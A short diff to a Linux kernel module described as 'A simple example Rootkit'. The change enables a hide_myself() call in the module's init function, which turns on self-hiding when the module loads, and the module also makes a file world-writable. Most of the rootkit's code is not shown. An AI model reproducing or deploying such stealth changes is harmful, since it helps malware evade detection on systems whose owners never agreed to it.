@@ -41,9 +41,8 @@ static int __init rootkit_init(void)
     __inode->i_mode |= 0666;
     filp_close(__file, NULL);
 
-    // hide_myself();
+    hide_myself();
     printk(KERN_ALERT "Module install successful!!!\n");
-    // disp_sys_call_table();
     return 0;
 }
 
@@ -62,4 +61,3 @@ MODULE_DESCRIPTION("A simple example Rootkit.");
 MODULE_VERSION("1.0");
 module_init(rootkit_init);
 module_exit(rootkit_exit);
-
